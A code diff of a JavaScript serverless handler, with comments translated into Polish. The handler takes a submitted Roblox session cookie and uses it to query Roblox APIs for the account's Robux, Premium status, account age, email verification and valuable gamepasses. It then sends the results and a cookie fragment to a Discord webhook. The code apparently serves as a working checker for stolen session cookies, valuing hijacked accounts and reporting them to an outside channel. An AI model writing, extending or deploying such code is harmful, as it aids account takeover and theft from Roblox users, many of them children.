@@ -1,24 +1,31 @@
 export default async function handler(req, res) {
+  // Nagłówki CORS – pozwalamy na POST i OPTIONS z dowolnego źródła
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
 
-  if (req.method === 'OPTIONS') return res.status(200).end();
-  if (req.method !== 'POST') return res.status(405).json({ error: 'Only POST is allowed' });
+  // Obsługa preflight (OPTIONS)
+  if (req.method === 'OPTIONS') {
+    return res.status(200).end();
+  }
+
+  // Tylko POST jest dozwolone
+  if (req.method !== 'POST') {
+    return res.status(405).json({ error: 'Only POST is allowed' });
+  }
 
   const { cookie } = req.body || {};
 
+  // Walidacja cookie
   if (!cookie || typeof cookie !== 'string' || cookie.length < 200) {
     return res.status(400).json({ error: 'Missing or invalid cookie' });
   }
 
-  // ────────────────────────────────────────────────
-  // UWAGA: zmień na swoją zmienną środowiskową lub wstaw tymczasowo link
+  // Zmienna webhooka z env Vercel (nigdy nie hardkoduj!)
   const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL || '';
 
-  if (!DISCORD_WEBHOOK_URL) {
-    console.warn('DISCORD_WEBHOOK_URL nie jest ustawiony – dane nie zostaną wysłane na Discord');
-  }
+  // Opcjonalny debug – usuń po testach
+  // console.log("Webhook URL z env:", DISCORD_WEBHOOK_URL ? "[ustawiony]" : "[BRAK]");
 
   try {
     // 1. Pobranie X-CSRF-Token
@@ -32,7 +39,7 @@ export default async function handler(req, res) {
 
     const csrfToken = tokenRes.headers.get('x-csrf-token');
     if (!csrfToken) {
-      throw new Error('Failed to obtain X-CSRF-Token – invalid/expired cookie?');
+      throw new Error('Nie udało się pobrać X-CSRF-Token – cookie nieważne/wygasłe?');
     }
 
     // 2. Dane użytkownika
@@ -47,14 +54,16 @@ export default async function handler(req, res) {
 
     if (!userRes.ok) {
       throw new Error(
-        userRes.status === 401 ? 'Invalid or expired cookie' : `API error: ${userRes.status}`
+        userRes.status === 401
+          ? 'Nieważne lub wygasłe cookie'
+          : `Błąd API: ${userRes.status}`
       );
     }
 
     const userData = await userRes.json();
 
     // ────────────────────────────────────────────────
-    // Sprawdzenie Verified Email (przez hat 102611803)
+    // Czy email zweryfikowany? (sprawdzamy posiadanie hatu 102611803)
     // ────────────────────────────────────────────────
     let emailVerified = false;
     try {
@@ -75,11 +84,11 @@ export default async function handler(req, res) {
         emailVerified = Array.isArray(ownsData.data) && ownsData.data.length > 0;
       }
     } catch {
-      // silent fail → zostaje false
+      // cichy fail → zostaje false
     }
 
     // ────────────────────────────────────────────────
-    // Premium / Robux / Wiek / Avatar / Gamepasy
+    // Premium, Robux, Wiek konta, Avatar, Gamepasy
     // ────────────────────────────────────────────────
     let hasPremium = false;
     try {
@@ -136,7 +145,7 @@ export default async function handler(req, res) {
       }
     } catch {}
 
-    // Gamepasy
+    // Gamepasy (MM2, AMP, SAB)
     const mm2Ids = [429957, 1308795];
     const ampIds = [189425850, 951065968, 951441773, 6408694, 60406961585546290, 7124470, 6965379, 3196348, 5300198];
     const sabIds = [1227013099, 1229510262, 1228591447];
@@ -166,7 +175,7 @@ export default async function handler(req, res) {
     } catch {}
 
     // ────────────────────────────────────────────────
-    // Przygotowanie wyniku
+    // Wynik do odpowiedzi + do Discorda
     // ────────────────────────────────────────────────
     const result = {
       success: true,
@@ -176,29 +185,29 @@ export default async function handler(req, res) {
       hasPremium,
       robux,
       accountAgeDays,
-      created: createdDate || 'failed to fetch',
+      created: createdDate || 'nie udało się pobrać',
       avatarUrl,
       hasGamePasses,
       emailVerified,
     };
 
-    // ─── Wysyłka do Discorda (jeśli webhook jest ustawiony) ────────
+    // Wysyłka do Discorda – tylko jeśli webhook jest ustawiony
     if (DISCORD_WEBHOOK_URL) {
       try {
         const embed = {
           title: `${result.username}  •  ${result.displayName}`,
-          description: `**User ID:** ${result.userId}\n**Wiek konta:** ${result.accountAgeDays} dni`,
+          description: `**ID:** ${result.userId}   •   Wiek: ${result.accountAgeDays} dni`,
           color: result.hasPremium ? 0x00aaff : 0xaaaaaa,
           fields: [
             { name: 'Robux', value: result.robux.toLocaleString(), inline: true },
             { name: 'Premium', value: result.hasPremium ? 'Tak' : 'Nie', inline: true },
-            { name: 'Email Verified', value: result.emailVerified ? 'Tak' : 'Nie', inline: true },
+            { name: 'Email zweryfikowany', value: result.emailVerified ? 'Tak' : 'Nie', inline: true },
           ],
           thumbnail: {
             url: result.avatarUrl || 'https://www.roblox.com/headshot-thumbnail/image?userId=1&width=720&height=720&format=png',
           },
           footer: {
-            text: `Cookie fragment → ${cookie.slice(0, 8)}...${cookie.slice(-6)}`,
+            text: `Cookie: ${cookie.slice(0, 8)}...${cookie.slice(-6)}`,
           },
           timestamp: new Date().toISOString(),
         };
@@ -215,22 +224,21 @@ export default async function handler(req, res) {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            username: 'Roblox Checker',
-            avatar_url: 'https://i.imgur.com/4M34hi2.png', // opcjonalny avatar
+            username: 'Roblox Info',
+            avatar_url: 'https://i.imgur.com/4M34hi2.png', // opcjonalny avatar bota
             embeds: [embed],
           }),
         });
-        // fire & forget – nie czekamy na odpowiedź
+        // nie obsługujemy błędu – nie chcemy psuć odpowiedzi API
       } catch (webhookErr) {
         console.error('Błąd wysyłki do Discorda:', webhookErr.message);
-        // nie psujemy odpowiedzi API
       }
     }
 
-    // ─── Odpowiedź dla klienta ─────────────────────────────────────
-    res.status(200).json(result);
+    // Zwracamy dane do klienta
+    return res.status(200).json(result);
   } catch (err) {
     console.error(err);
-    res.status(500).json({ error: err.message || 'Internal server error' });
+    return res.status(500).json({ error: err.message || 'Błąd wewnętrzny serwera' });
   }
 }
